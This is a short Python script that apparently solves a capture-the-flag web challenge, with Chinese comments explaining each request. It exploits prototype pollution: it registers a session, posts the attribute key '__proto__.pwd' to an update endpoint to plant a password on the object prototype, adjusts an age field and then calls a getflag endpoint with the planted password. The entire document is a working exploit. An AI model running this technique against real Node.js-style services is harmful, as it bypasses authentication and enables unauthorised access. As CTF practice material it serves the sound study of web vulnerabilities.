import requests

s = requests.session()
header = {'Content-Type': 'application/json'}       # header类型必须设置为json
url = str(input("\033[35mPlease input CTF url example:http://114.67.246.176:17356/\nurl: \033[0m"))

reg = s.get(url+'reg')                              # 必须先注册，不然下一步会被重定向到reg
print(reg.text)

p1 = {'attrkey': '__proto__.pwd','attrval': '1'}    # 增加对象原型参数pwd为1
update = s.post(url=url + 'update', headers=header, json=p1)
print(update.text)

p2 = {'attrkey': 'age','attrval': '79'}             # 修改年龄小于80即可
update = s.post(url=url + 'update', headers=header, json=p2)
print(update.text)

p3 = {'key': 'pwd','password':'1'}                  # 传入key和password
getflag = s.post(url=url + 'getflag', headers=header, json=p3)
print(getflag.text)
